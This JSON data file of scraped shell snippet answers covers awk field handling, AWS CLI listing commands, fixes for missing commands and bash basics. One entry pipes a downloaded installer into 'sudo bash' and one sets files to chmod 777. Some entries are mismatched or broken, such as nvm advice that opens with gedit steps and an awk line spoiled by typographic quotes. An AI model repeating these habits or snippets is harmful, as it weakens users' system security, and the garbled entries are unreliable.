    "description": "# Basic syntax: awk -F'[:/|]' '{print $field#, $field#, ...}' input_file # Where: #\t- : / and | are the three field delimiters considered #\t- $field# is the field nuber to be printed based on the splits made #\t\tby any of the delimiters  # Example usage: # Say you have a file that contains the following lines and you want to # extract the dir#, the file #, and the URL: /logs/dir1/file_1 = demo.example.com /logs/dir2/file_7 = quest.example.com /logs/dir3/file_5 = www.example.com  # Running: awk -F'[/_=]' '{print $3, $5, $6}' input_file  # Returns: dir1\t1\tdemo.example.com dir2\t7\tquest.example.com dir3\t5\twww.example.com  # *Note, each character contained in the braces [ ] is treated as a  #\tseparate delimiter\n# by default, awk uses empty space(s) as field seperator # we can specify field seperator ourselves using -F flag  # SINGLE field seperator echo 'a+b=c' | awk -F'=' '{print NF, $1, $2}' # NF in awk stands for number of fields # Returns 2\ta+b \tc  # MULTIPLE field seperators echo 'a+b=c' | awk -F'[+=]' '{print NF, $1, $2, $3}' # Returns 3\ta\tb\tc   \nJust use function split in awk command to split a line into an array 'a' using a choosen string as delimiter as for example \", \" in next use case: echo \"hi, bye, hey\" | awk '{split($0,a,\", \"); print a[3],a[2],a[1]}'\n",
    "reg_date": "2021-10-11T22:01:20.000Z"
  },
  {
    "id": 507,
    "keyword": null,
    "link": null,
    "title": " awk get last field",
    "description": "awk -F \"/\" '{print $NF}' input\t #Retrieves last field in line delimited with \"/\"\n",
    "reg_date": "2021-10-11T22:01:21.000Z"
  },
  {
    "id": 508,
    "keyword": null,
    "link": null,
    "title": " awk how to print line minus end characters",
    "description": "# Basic syntax: awk '{print substr($0, 1, length($0)-#_characters)}' input_file # Where #_characters is the number of characters you want to remove  # Example usage: # Say your input_file has the line: Id rather not end this line with garbage garbage  awk '{print substr($0, 1, length($0)-7)}' input_file # Would print: --> Id rather not end this line with garbage  # Note, the general syntax for the awk substr() command is: substr(field, start_character, number_characters_to_print_beyond_start) # Note, tabs are treated as one character\n",
    "reg_date": "2021-10-11T22:01:21.000Z"
  },
  {
    "id": 509,
    "keyword": null,
    "link": null,
    "title": " awk how to print without adding spaces between fields",
    "description": "# Short answer: # If you're getting unwanted spaces between the items you're printing  # with awk you probably need to remove commas between the items.  # Example of problem: awk '{print $1, \"some-text\", $2}' file_to_parse # $1 and $2 are the  # first and second fields/columns of the the file_to_parse --> field_1 some text field_2 # Output  # If you didn't want spaces, remove the commas: awk '{print $1 \"some-text\" $2}' file_to_parse --> field_1some-textfield_2 # Output\n",
    "reg_date": "2021-10-11T22:01:21.000Z"
  },
  {
    "id": 510,
    "keyword": null,
    "link": null,
    "title": " awk how to remove lines in one file that are found in another file",
    "description": "# Example 1 awk 'NR==FNR{a[$0];next} !($0 in a)' file_2 file_1 # This returns all lines in file_1 that are not found in file_2 # See source for more info on how the command works\n",
    "reg_date": "2021-10-11T22:01:21.000Z"
  },
  {
    "id": 511,
    "keyword": null,
    "link": null,
    "title": " awk if else statement",
    "description": "# Basic syntax: awk 'BEGIN {if(condition) outcome}' # if awk 'BEGIN {if(condition_1) outcome_1; else outcome_2}' # if else awk 'BEGIN {if(condition_1) outcome_1; else if(condition_2) outcome_2}' # if else if  # Example usage: awk 'BEGIN {if(2>3) print \"1_is_true\"; else print 6}' --> 6  # For multi-line and ternary operator syntax, see source\n",
    "reg_date": "2021-10-11T22:01:21.000Z"
  },
  {
    "id": 512,
    "keyword": null,
    "link": null,
    "title": " awk lowercase",
    "description": "echo EXAMPLE | awk -F 'd' '{ print tolower($1)}' example\t\t#Example first lowercased outputed\n",
    "reg_date": "2021-10-11T22:01:22.000Z"
  },
  {
    "id": 513,
    "keyword": null,
    "link": null,
    "title": " awk multiple delimiters",
    "description": "# Basic syntax: awk -F'[:/|]' '{print $field#, $field#, ...}' input_file # Where: #\t- : / and | are the three field delimiters considered #\t- $field# is the field nuber to be printed based on the splits made #\t\tby any of the delimiters  # Example usage: # Say you have a file that contains the following lines and you want to # extract the dir#, the file #, and the URL: /logs/dir1/file_1 = demo.example.com /logs/dir2/file_7 = quest.example.com /logs/dir3/file_5 = www.example.com  # Running: awk -F'[/_=]' '{print $3, $5, $6}' input_file  # Returns: dir1\t1\tdemo.example.com dir2\t7\tquest.example.com dir3\t5\twww.example.com  # *Note, each character contained in the braces [ ] is treated as a  #\tseparate delimiter\n",
    "reg_date": "2021-10-11T22:01:22.000Z"
  },
  {
    "id": 514,
    "keyword": null,
    "link": null,
    "title": " awk print first column",
    "description": "awk '{print $1}'\n",
    "reg_date": "2021-10-11T22:01:22.000Z"
  },
  {
    "id": 515,
    "keyword": null,
    "link": null,
    "title": " awk print lines when match is found with specific field",
    "description": "# Basic awk syntax: awk 'condition { print $0 }' input_file  # Example usage: awk '$2 == \"string_to_match\" { print $0 }' input_file # This prints the entire line ($0) when field 2 ($2) is equal to the # string \"string_to_match\"\n",
    "reg_date": "2021-10-11T22:01:22.000Z"
  },
  {
    "id": 516,
    "keyword": null,
    "link": null,
    "title": " awk print rows that aren't blank in specific field",
    "description": "# Basic syntax: awk -F'delimiter' '$column# != \"\"' input_file  # Example usage: awk -F'\\t' '$3 != \"\"' input_file # This prints every line in which the 3rd tab-delimited column is  # not blank. Change the 3 to any column and/or add other conditions  # for your application\n",
    "reg_date": "2021-10-11T22:01:22.000Z"
  },
  {
    "id": 517,
    "keyword": null,
    "link": null,
    "title": " awk variable",
    "description": "Just use following command to get a variable with awk command: echo | awk -v myvar='AWK variable' '{print myvar}'\n",
    "reg_date": "2021-10-11T22:01:22.000Z"
  },
  {
    "id": 518,
    "keyword": null,
    "link": null,
    "title": " aws cli ec2 list instances",
    "description": "# Get list of all EC2 (all info) awsProfile=\"awsProfileName\" # Use your aws profile name aws --profile \"$awsProfile\" ec2 describe-instances  # Get list of all EC2 (custom filter) awsProfile=\"awsProfileName\" # Use your aws profile name awsQuery=\"Reservations[].Instances[].{InstanceId:InstanceId,Placement:Placement,PrivateIpAddress:PrivateIpAddress,PublicIpAddress:PublicIpAddress,Tags:Tags}\" aws --profile \"$awsProfile\" ec2 describe-instances --query \"$awsQuery\"\n",
    "reg_date": "2021-10-11T22:01:22.000Z"
  },
  {
    "id": 519,
    "keyword": null,
    "link": null,
    "title": " aws cli ec2 list security groups",
    "description": "# Get EC2 Security Group awsProfile=\"awsProfileName\" # Use your aws profile name instanceId=\"i-00000000000000000\" # Enter instance ID awsQuery=\"Reservations[].Instances[].{SecurityGroups:SecurityGroups}[0]\" aws --profile \"$awsProfile\" ec2 describeInstance --instance-ids \"$instanceId\" --query \"$awsQuery\"\n",
    "reg_date": "2021-10-11T22:01:22.000Z"
  },
  {
    "id": 520,
    "keyword": null,
    "link": null,
    "title": " aws cli profiles list",
    "description": "aws configure list [--profile profile-name]\n",
    "reg_date": "2021-10-11T22:01:23.000Z"
  },
  {
    "id": 521,
    "keyword": null,
    "link": null,
    "title": " aws cli s3 bucket list",
    "description": "aws s3api list-buckets --query \"Buckets[].Name\"\naws s3api list-buckets --query \"Buckets[].Name\" \n",
    "reg_date": "2021-10-11T22:01:23.000Z"
  },
  {
    "id": 522,
    "keyword": null,
    "link": null,
    "title": " aws cloudfront invalidation cli",
    "description": "aws cloudfront create-invalidation --distribution-id E1B1A4GHK9TTE --paths \"/*\"\n",
    "reg_date": "2021-10-11T22:01:23.000Z"
  },
  {
    "id": 523,
    "keyword": null,
    "link": null,
    "title": " aws config kubectl",
    "description": "aws eks --region <region-code> update-kubeconfig --name <cluster_name>\n",
    "reg_date": "2021-10-11T22:01:23.000Z"
  },
  {
    "id": 524,
    "keyword": null,
    "link": null,
    "title": " aws list profile",
    "description": "aws configure list [--profile profile-name]\n",
    "reg_date": "2021-10-11T22:01:23.000Z"
  },
  {
    "id": 525,
    "keyword": null,
    "link": null,
    "title": " az cli installation in ubuntu",
    "description": "curl -sL https://aka.ms/InstallAzureCLIDeb | sudo bash \n",
    "reg_date": "2021-10-11T22:01:23.000Z"
  },
  {
    "id": 526,
    "keyword": null,
    "link": null,
    "title": " bash: /bin/rm: Argument list too long",
    "description": "// aviod Argument list too long find . -maxdepth 1 -type f -name \"temp_file_name_*\" -delete\n# Non recursive  # [1] rm specific file extension find . -maxdepth 1 -name \"*.pdf\" -print0 | xargs -0 rm  # [2] chmod files find . -maxdepth 1 -name \"*.html\" -print0 | xargs -0 chmod 777\n",
    "reg_date": "2021-10-11T22:01:23.000Z"
  },
  {
    "id": 527,
    "keyword": null,
    "link": null,
    "title": " bash: bin/activate: No such file or directory",
    "description": "$ virtualenv env $ cd env/Scripts/ $ . activate \n",
    "reg_date": "2021-10-11T22:01:24.000Z"
  },
  {
    "id": 528,
    "keyword": null,
    "link": null,
    "title": " bash: cmake: command not found",
    "description": "sudo apt-get install build-essential cmake \ncmake --version\n",
    "reg_date": "2021-10-11T22:01:24.000Z"
  },
  {
    "id": 529,
    "keyword": null,
    "link": null,
    "title": " bash: flutter: command not found",
    "description": "# Tried out all the above methods, but all of them lasted only until  # the terminal was open. So I went ahead and directly added it to the  # path file permanently. sudo nano /etc/paths # add this to the file /Users/yourUserName/Development/flutter/bin\nOpen Terminal nano ~/.zshrc Add: export PATH=[PATH_TO_FLUTTER_GIT_DIRECTORY]/flutter/bin:$PATH  Run: source ~/.zshrc restart terminal Run: flutter doctor -v\nexport PATH=[PATH_TO_FLUTTER_GIT_DIRECTORY]/flutter/bin:$PATH\n",
    "reg_date": "2021-10-11T22:01:24.000Z"
  },
  {
    "id": 530,
    "keyword": null,
    "link": null,
    "title": " bash: gedit: command not found",
    "description": "First, try this: sudo apt-get install gedit  or You can try this  sudo apt-get purge gedit gedit-common sudo apt-get clean  After this try reinstalling with  sudo apt-get install gedit \n",
    "reg_date": "2021-10-11T22:01:24.000Z"
  },
  {
    "id": 531,
    "keyword": null,
    "link": null,
    "title": " bash: gulp: command not found",
    "description": "npm install gulp-cli -g\n",
    "reg_date": "2021-10-11T22:01:24.000Z"
  },
  {
    "id": 532,
    "keyword": null,
    "link": null,
    "title": " bash: lsb release: command not found",
    "description": "apt-get update && apt-get install -y lsb-release && apt-get clean all \napt-get install -y lsb-release \n",
    "reg_date": "2021-10-11T22:01:24.000Z"
  },
  {
    "id": 533,
    "keyword": null,
    "link": null,
    "title": " bash: netstat: command not found",
    "description": "apt-get install net-tools\n# yum install net-tools     [On CentOS/RHEL] # apt install net-tools     [On Debian/Ubuntu] # zypper install net-tools  [On OpenSuse] # pacman -S netstat-nat     [On Arch Linux] \n",
    "reg_date": "2021-10-11T22:01:24.000Z"
  },
  {
    "id": 534,
    "keyword": null,
    "link": null,
    "title": " bash: nvm: command not found",
    "description": "First, try this: sudo apt-get install gedit  or You can try this  sudo apt-get purge gedit gedit-common sudo apt-get clean  After this try reinstalling with  sudo apt-get install gedit \nsource ~/.nvm/nvm.sh \nsource $HOME/.nvm/nvm.sh\nbrew reinstall nvm\n# NVM Stuff export NVM_DIR=\"$HOME/.nvm\" . \"/usr/local/opt/nvm/nvm.sh\"\n# Check your .bash_profile, .zshrc, or .profile file. # You most likely had a problem during the installation. # You should have the following at the end of one of those files. [[ -s $HOME/.nvm/nvm.sh ]] && . $HOME/.nvm/nvm.sh  # This loads NVM\n",
    "reg_date": "2021-10-11T22:01:25.000Z"
  },
  {
    "id": 535,
    "keyword": null,
    "link": null,
    "title": " bash: pip: command not found",
    "description": "apt-get install python3-pip\nsudo easy_install pip\napt-get install python3-pip \nbash: pip: command not found\n",
    "reg_date": "2021-10-11T22:01:25.000Z"
  },
  {
    "id": 536,
    "keyword": null,
    "link": null,
    "title": " bash: ps: command not found",
    "description": "RUN apt-get update && apt-get install -y procps \n",
    "reg_date": "2021-10-11T22:01:25.000Z"
  },
  {
    "id": 537,
    "keyword": null,
    "link": null,
    "title": " bash: ufw : commande introuvable",
    "description": "apt-get update && apt-get install ufw -y\n",
    "reg_date": "2021-10-11T22:01:25.000Z"
  },
  {
    "id": 538,
    "keyword": null,
    "link": null,
    "title": " bash: yarn: command not found",
    "description": "npm install --global yarn\nbrew install yarn \nbrew install yarn\n",
    "reg_date": "2021-10-11T22:01:25.000Z"
  },
  {
    "id": 539,
    "keyword": null,
    "link": null,
    "title": " bash: zipalign: command not found",
    "description": "find ~/Library/Android/sdk/build-tools -name \"zipalign\"\n// Download gow file and install https://github.com/bmatzelle/gow/releases  // Go to installed folder (Default C:\\Program Files (x86)\\Gow\\bin) // find and install 'zip.exe' // restart bash and run previously failed command \n",
    "reg_date": "2021-10-11T22:01:25.000Z"
  },
  {
    "id": 540,
    "keyword": null,
    "link": null,
    "title": " bash How To Transfer Files From a Remote Server to another Remote Server",
    "description": "# Basic syntax: scp source destination  # Note, usually one or both of \"source\" and \"destination\" are remote  # \t(otherwise you'd just use cp for a local copy) # To specify a local source or destination, just use the directory path # To specify a remote destination, the format is: # user@remote.server.com:/path/to/directory  # Example usage: scp /Users/name/Downloads/*.txt user@remote.server.com:/path/to/directory # In this example, you'd be uploading all text files from your downloads  # to the remote server  scp user@remote.server.com:/path/to/directory/*png /Users/name/Downloads # In this example, you'd be downloading all png files from the remote # server to your downloads directory  scp user@remote.server.com:/path/to/directory/my_favorite_file.txt user@other.remote.server.com:/path/to/directory # In this example, you'd be moving a file from one remote server to  # another remote server  scp -r user@remote.server.com:/path/to/directory /Users/name/Downloads # In this example the -r flag is used to state that this is a recursive # download, meaning that all files and subdirectories in the directory # will be downloaded to the local Downloads directory\ndragonmnl@local $ scp -P 2222 file.ext username@domain:~/  \nscp files\n",
    "reg_date": "2021-10-11T22:01:25.000Z"
  },
  {
    "id": 541,
    "keyword": null,
    "link": null,
    "title": " bash add chr to beginning of vcf",
    "description": "# Example usage: awk '{if($0 !~ /^#/) print \"chr\"$0; else print $0}' input.vcf # This converts a vcf file with numeric genome coordinates to one with  # chr in front of the chromosome number.   # Note, this command does the opposite operation, if needed: awk '{gsub(/^chr/,\"\"); print}' input.vcf\n",
    "reg_date": "2021-10-11T22:01:25.000Z"
  },
  {
    "id": 542,
    "keyword": null,
    "link": null,
    "title": " bash add new line to crontab",
    "description": "#!/bin/bash  line=\"* * * * * /path/to/command\" (crontab -u userhere -l; echo \"$line\" ) | crontab -u userhere - \n",
    "reg_date": "2021-10-11T22:01:26.000Z"
  },
  {
    "id": 543,
    "keyword": null,
    "link": null,
    "title": " bash add or subtract one column from another",
    "description": "# Basic syntax: awk 'BEGIN {set_delimiter}; {print $column# +_or_- $column#}' input_file  # Example usage: awk 'BEGIN {OFS=\"\\t\"}; {print $1 - $2}' input_file # Set the delimiter to tab-delimited, print column 1 minus column 2  awk 'BEGIN {OFS=\"\\t\"}; {print $0, $1 + $2}' input_file # Set the delimiter to tab-delimited, print all columns followed by # column 1 plus column 2\n",
    "reg_date": "2021-10-11T22:01:26.000Z"
  },
  {
    "id": 544,
    "keyword": null,
    "link": null,
    "title": " bash add text to the beginning or end of every line",
    "description": "# Basic syntax: awk '{print \"PREFIX\"$0}' input_file # Prepend \"PREFIX\" to every row in the input_file awk '{print $0\"SUFFIX\"}' input_file # Append \"SUFFIX\" to every row in the input_file awk '{print \"PREFIX\"$0\"SUFFIX\"}' # Prepend \"PREFIX\" and append \"SUFFIX\" to every row in the input_file\n",
    "reg_date": "2021-10-11T22:01:26.000Z"
  },
  {
    "id": 545,
    "keyword": null,
    "link": null,
    "title": " bash append file",
    "description": "# syntax (note: the -e switch is to allow for backslash escapes) echo -e \"<string-to-append>\" >> <file-to-append-to>  # example  echo -e \"Hello there, new line!\" >> RandomWorld.txt  # ----------------------------------------------- # In order to see the effect of -e, append the following string: \"Hello there,\\n new line!\" \n",
    "reg_date": "2021-10-11T22:01:26.000Z"
  },
  {
    "id": 546,
    "keyword": null,
    "link": null,
    "title": " bash array",
    "description": "# create an array - just assign first value arrayname[0]='VALUE'  # define an array declare -a arrayname=(element1 element2 element3)  # get array element at index  ${arrayname[2]}  # get all array elements ${arrayname[@]}  # get array length ${#arrayname[@]}\n#to create an array: $ declare -a my_array #set number of items with spaceBar seperation: $ my_array = (item1 item2) #set specific index item: $ my_array[0] = item1\nss=\"abcdefghi\" my_array=( `echo $ss | grep -o . ` ) # split word into array  echo ${my_array[2]}  give c  i=0 echo ${my_array[$i]}${my_array[$i+1]}xxx give : abxxx\n",
    "reg_date": "2021-10-11T22:01:26.000Z"
  },
  {
    "id": 547,
    "keyword": null,
    "link": null,
    "title": " bash bc",
    "description": "bc -l <<< '10/3' # Fast way 3.33333333333333333333 bc <<< 'scale=2; 10/3' #Define also how many decimals to take in scale 3.33\n",
    "reg_date": "2021-10-11T22:01:26.000Z"
  },
  {
    "id": 548,
    "keyword": null,
    "link": null,
    "title": " bash calculate division",
    "description": "bc -l <<< '10/3' # Fast way 3.33333333333333333333 bc <<< 'scale=2; 10/3' #Define also how many decimals to take in scale 3.33\n",
    "reg_date": "2021-10-11T22:01:26.000Z"
  },
  {
    "id": 549,
    "keyword": null,
    "link": null,
    "title": " bash calculate the mean of a column",
    "description": "# Example usage: awk 'BEGIN{s=0;}{s=s+$1;}END{print s/NR;}' input_file # Mean of column 1 # Change the 1 to the number of the column for which you want the mean\n",
    "reg_date": "2021-10-11T22:01:27.000Z"
  },
  {
    "id": 550,
    "keyword": null,
    "link": null,
    "title": " bash calculate the standard deviation of a column\t",
    "description": "# Example usage: awk '{delta = $1 - avg; avg += delta / NR; mean2 += delta * ($1 - avg); } END { print sqrt(mean2 / NR); }' input_file # This produces the standard deviation for column 1. Change the 1s to # whichever column number you want.  # Example usage 2: awk &lsquo;{delta = $1 &ndash; avg; avg += delta / NR; mean2 += delta * ($1 &ndash; avg); } END { print sqrt(mean2 / (NR-1)); }&rsquo; input_file # This is the calculation for a sample instead of a population\n",
    "reg_date": "2021-10-11T22:01:27.000Z"
  },
  {
    "id": 551,
    "keyword": null,
    "link": null,
    "title": " bash cat remove special characters",
    "description": "cat yourfile.txt | tr -dc '[:alnum:]\\n\\r' cat yourfile.txt | sed 's/[^a-zA-Z0-9]//g' cat yourfile.txt | tr -dc '[:print:]'\n",
    "reg_date": "2021-10-11T22:01:27.000Z"
  },
  {
    "id": 552,
    "keyword": null,
    "link": null,
    "title": " bash change output color",
    "description": "echo -e '\\e[31m'\t# The output color is now red  Reset = '\\e[0m' Bright = '\\e[1m' Dim = '\\e[2m' Underscore = '\\e[4m' Blink = '\\e[5m' Reverse = '\\e[7m' Hidden = '\\e[8m'  FgBlack = '\\e[30m' FgRed = '\\e[31m' FgGreen = '\\e[32m' FgYellow = '\\e[33m' FgBlue = '\\e[34m' FgMagenta = '\\e[35m' FgCyan = '\\e[36m' FgWhite = '\\e[37m'  BgBlack = '\\e[40m' BgRed = '\\e[41m' BgGreen = '\\e[42m' BgYellow = '\\e[43m' BgBlue = '\\e[44m' BgMagenta = '\\e[45m' BgCyan = '\\e[46m' BgWhite = '\\e[47m'\necho -e \"Default \\e[34mBlue\"\n",
    "reg_date": "2021-10-11T22:01:27.000Z"
  },
  {
    "id": 553,
    "keyword": null,
    "link": null,
    "title": " bash check if file is empty",
    "description": "if [ -s FILE ]; \n",
    "reg_date": "2021-10-11T22:01:27.000Z"
  },
  {
    "id": 554,
    "keyword": null,
    "link": null,
    "title": " bash check if process is running by name",
    "description": "if pgrep -x \"<PROCESS_NAME>\" > /dev/null; then \techo \"Running\" else \techo \"Not running\" fi\n",
    "reg_date": "2021-10-11T22:01:27.000Z"
  },
  {
    "id": 555,
    "keyword": null,
    "link": null,
    "title": " bash check if string equals multiple",
    "description": "# Basic syntax: case your_word in   words | to | match) <command_to_execute_if_match>;;   *) <command_to_execute_no_match>;; esac  # Where #\t- your_word is checked against words, to, and match #\t- If a match is found, the command_to_execute_if_match is run #\t- | is used to indicate \"OR\" #\t- ;; indicates that no further matches should be considered if a #\t\tmatch is found. Use ;& to check additional clauses after #\t\texecuting the code for the current match #\t- * is used to match anything, so it works as the \"else\" clause here #\t- Additional cases can be added between the first and the last  # Example usage: case $ANIMAL in   horse | dog | cat) echo -n \"four\";;   man | kangaroo ) echo -n \"two\";;   *) echo -n \"an unknown number of\";; esac\n",
    "reg_date": "2021-10-11T22:01:27.000Z"
  },
  {
    "id": 556,
    "keyword": null,
    "link": null,
    "title": " bash colors",
    "description": "echo -e '\\e[31m'\t# The output color is now red  Reset = '\\e[0m' Bright = '\\e[1m' Dim = '\\e[2m' Underscore = '\\e[4m' Blink = '\\e[5m' Reverse = '\\e[7m' Hidden = '\\e[8m'  FgBlack = '\\e[30m' FgRed = '\\e[31m' FgGreen = '\\e[32m' FgYellow = '\\e[33m' FgBlue = '\\e[34m' FgMagenta = '\\e[35m' FgCyan = '\\e[36m' FgWhite = '\\e[37m'  BgBlack = '\\e[40m' BgRed = '\\e[41m' BgGreen = '\\e[42m' BgYellow = '\\e[43m' BgBlue = '\\e[44m' BgMagenta = '\\e[45m' BgCyan = '\\e[46m' BgWhite = '\\e[47m'\n# Reset Color_Off='\\033[0m'       # Text Reset  # Regular Colors Black='\\033[0;30m'        # Black Red='\\033[0;31m'          # Red Green='\\033[0;32m'        # Green Yellow='\\033[0;33m'       # Yellow Blue='\\033[0;34m'         # Blue Purple='\\033[0;35m'       # Purple Cyan='\\033[0;36m'         # Cyan White='\\033[0;37m'        # White  # Bold BBlack='\\033[1;30m'       # Black BRed='\\033[1;31m'         # Red BGreen='\\033[1;32m'       # Green BYellow='\\033[1;33m'      # Yellow BBlue='\\033[1;34m'        # Blue BPurple='\\033[1;35m'      # Purple BCyan='\\033[1;36m'        # Cyan BWhite='\\033[1;37m'       # White  # Underline UBlack='\\033[4;30m'       # Black URed='\\033[4;31m'         # Red UGreen='\\033[4;32m'       # Green UYellow='\\033[4;33m'      # Yellow UBlue='\\033[4;34m'        # Blue UPurple='\\033[4;35m'      # Purple UCyan='\\033[4;36m'        # Cyan UWhite='\\033[4;37m'       # White  # Background On_Black='\\033[40m'       # Black On_Red='\\033[41m'         # Red On_Green='\\033[42m'       # Green On_Yellow='\\033[43m'      # Yellow On_Blue='\\033[44m'        # Blue On_Purple='\\033[45m'      # Purple On_Cyan='\\033[46m'        # Cyan On_White='\\033[47m'       # White  # High Intensity IBlack='\\033[0;90m'       # Black IRed='\\033[0;91m'         # Red IGreen='\\033[0;92m'       # Green IYellow='\\033[0;93m'      # Yellow IBlue='\\033[0;94m'        # Blue IPurple='\\033[0;95m'      # Purple ICyan='\\033[0;96m'        # Cyan IWhite='\\033[0;97m'       # White  # Bold High Intensity BIBlack='\\033[1;90m'      # Black BIRed='\\033[1;91m'        # Red BIGreen='\\033[1;92m'      # Green BIYellow='\\033[1;93m'     # Yellow BIBlue='\\033[1;94m'       # Blue BIPurple='\\033[1;95m'     # Purple BICyan='\\033[1;96m'       # Cyan BIWhite='\\033[1;97m'      # White  # High Intensity backgrounds On_IBlack='\\033[0;100m'   # Black On_IRed='\\033[0;101m'     # Red On_IGreen='\\033[0;102m'   # Green On_IYellow='\\033[0;103m'  # Yellow On_IBlue='\\033[0;104m'    # Blue On_IPurple='\\033[0;105m'  # Purple On_ICyan='\\033[0;106m'    # Cyan On_IWhite='\\033[0;107m'   # White \necho -e \"Default \\e[34mBlue\"\nBLACK=$(tput setaf 0) RED=$(tput setaf 1) GREEN=$(tput setaf 2) YELLOW=$(tput setaf 3) LIME_YELLOW=$(tput setaf 190) POWDER_BLUE=$(tput setaf 153) BLUE=$(tput setaf 4) MAGENTA=$(tput setaf 5) CYAN=$(tput setaf 6) WHITE=$(tput setaf 7) BRIGHT=$(tput bold) NORMAL=$(tput sgr0) BLINK=$(tput blink) REVERSE=$(tput smso) UNDERLINE=$(tput smul) \n",
    "reg_date": "2021-10-11T22:01:27.000Z"
  },
  {
    "id": 557,
    "keyword": null,
    "link": null,
    "title": " bash command for unzipping tar.gz files",
    "description": "# Basic syntax: tar -zxvf file.tar.gz  # Where: #\t- x tells tar to extract the files #\t- v tells the command to list all of the files in the archive #\t- z tells the tar command to uncompress the file (gzip) #\t- f tells tar that you are going to give it a file name to work with\ntar xvzf file.tar.gz\n  tar -xvzf community_images.tar.gz Also, to extract in a specific directory  for eg. to extract the archive into a custom my_images directory .  tar -xvzf community_images.tar.gz -C my_images\n",
    "reg_date": "2021-10-11T22:01:28.000Z"
  },
  {
    "id": 558,
    "keyword": null,
    "link": null,
    "title": " bash command to find the number of files in a directory",
    "description": "ls -1q  | wc -l\n",
    "reg_date": "2021-10-11T22:01:28.000Z"
  },
  {
    "id": 559,
    "keyword": null,
    "link": null,
    "title": " bash comment",
    "description": "# This is a Bash comment. echo \"This is Code\" # This is an inline Bash comment.\n# This is a comment in Shell/Bash Script. # '#' Symbol is used show a comment.\n# This is a comment on powershell. # It will work on bash too.\n# Bash comment\n#SINGLE COMMENT  <<COMMENT  MULTILINE COMMENT COMMENT  : '  MULTILINE COMMENT '  echo \"Hello Wordl\"\n#!/bin/bash # By adding hash(#) before line it will takes it as comment.\n",
    "reg_date": "2021-10-11T22:01:28.000Z"
  },
  {
    "id": 560,
    "keyword": null,
    "link": null,
    "title": " bash compare two lists of checksums",
    "description": "# Example usage: cat checksum_list_1 checksum_list_2 | sort | uniq -c | sort | less # This command concatenates the lists, sorts them so that repeated # checksums are adjactent, adds the count of each, and then sorts them # again so that highers counts are at the bottom. Normally, when  # transferring files from A to B, you expect a count of two for each # file. Counts of one indicate unique md5sums which probably mean there # was an issue in the transfer\n",
    "reg_date": "2021-10-11T22:01:28.000Z"
  },
  {
    "id": 561,
    "keyword": null,
    "link": null,
    "title": " bash concatenate files into one",
    "description": "# Basic syntax: cat <search_pattern> >> combined_files.txt # Where >> indicates appending (vs > which overwrites the file)  # Example usage: # Say you want to combine all text files in the current directory into # one. To do this, run: cat *.txt >> all_text.txt\n",
    "reg_date": "2021-10-11T22:01:28.000Z"
  },
  {
    "id": 562,
    "keyword": null,
    "link": null,
    "title": " bash concatenate two columns",
    "description": "# Basic syntax using awk: awk 'BEGIN {FS=\"input_delimiter\"; OFS=\"output_delimiter\"}; {print $column# \"sep\" $column#}' input_file  # Where: #\t- The input_delimiter is the delimiter separating columns in  #\t\tthe input_file #\t- The output_delimiter is is the delimiter separating columns in  #\t\tthe output #\t- column# is the column to concatenate (row-wise) #\t- sep is optional separating text between the columns  # Example usage:  # Say you had a file with fields like the following and want to combine #\tfields 2 and 4 in the output a,series,of,comma separated,columns,to,be joined,together,using,the second,and,fourth,columns  # Running: awk 'BEGIN {FS=\",\"; OFS=\"\\t\"}; {print $2 \"_\" $4}' input_file  # Would return: series_comma columns_be together_the and_columns\n",
    "reg_date": "2021-10-11T22:01:28.000Z"
  },
  {
    "id": 563,
    "keyword": null,
    "link": null,
    "title": " bash conditional regex match",
    "description": "Just appreciate next solution example for your code implementation: S=finding if[[ \"$S\" == *ing ]]; then ...//some code run if string ends with 'ing' More generally: if[[ \"string_to_check\" == regex_patten ]]; then ...//some code\n",
    "reg_date": "2021-10-11T22:01:28.000Z"
  },
  {
    "id": 564,
    "keyword": null,
    "link": null,
    "title": " bash copy all hidden files",
    "description": "# Basic syntax: rsync -a /directory/with/hidden/files/.[^.]* /destination/directory/  # Example usage: # Say you wanted to copy all hidden directories from your home folder: rsync -a ~/.[^.]* /path/to/destination/directory\n",
    "reg_date": "2021-10-11T22:01:29.000Z"
  },
  {
    "id": 565,
    "keyword": null,
    "link": null,
    "title": " bash copy files but exclude some directories",
    "description": "# Basic syntax: rsync -a /directory/to/copy --exclude=directory_to_ignore  # Note, the directory_to_ignore can be anywhere within the  #\t/directory/to/copy # Note, to add additional directories to ignore, add more --exclude #\tstatements\n",
    "reg_date": "2021-10-11T22:01:29.000Z"
  },
  {
    "id": 566,
    "keyword": null,
    "link": null,
    "title": " bash copy overwrite",
    "description": "yes | cp -rf <source-path> <destination-path>\n",
    "reg_date": "2021-10-11T22:01:29.000Z"
  },
  {
    "id": 567,
    "keyword": null,
    "link": null,
    "title": " bash copy without prompt",
    "description": "yes | cp -rf <source-path> <destination-path>\n",
    "reg_date": "2021-10-11T22:01:29.000Z"
  },
  {
    "id": 568,
    "keyword": null,
    "link": null,
    "title": " bash count the number of lines that meet condition",
    "description": "# Basic syntax: awk 'condition { count_variable++ } END { print count_variable }' input_file # Where: #\t- ++ increases the count by 1 when the condition is true #\t- END specifies what to do after the input_file has been processed  # Example usage: awk '$3==\"NA\" { count++ } END { print count }' input_file # This returns the count of the lines in column/field 3 that are NA  # Example usage: awk '$1==\"word\" && $2==42 { count++ } END {print count}' input_file # This returns the count of the lines that are \"word\" in column 1 AND # 42 in column 2\n",
    "reg_date": "2021-10-11T22:01:29.000Z"
  },
  {
    "id": 569,
    "keyword": null,
    "link": null,
    "title": " bash cut first column",
    "description": "Just use cut command with a defined delimeter as a space ' ' and choose to cut since second word match until end '-f2-' as for example: cat file.txt | cut -d ' ' -f2- If for example space delimiter ' ' is repeated in your line check how many times, since matching word number must then be adapted. For example: history | cut -d ' ' -f4-\n",
    "reg_date": "2021-10-11T22:01:29.000Z"
  },
  {
    "id": 570,
    "keyword": null,
    "link": null,
    "title": " bash date variable format",
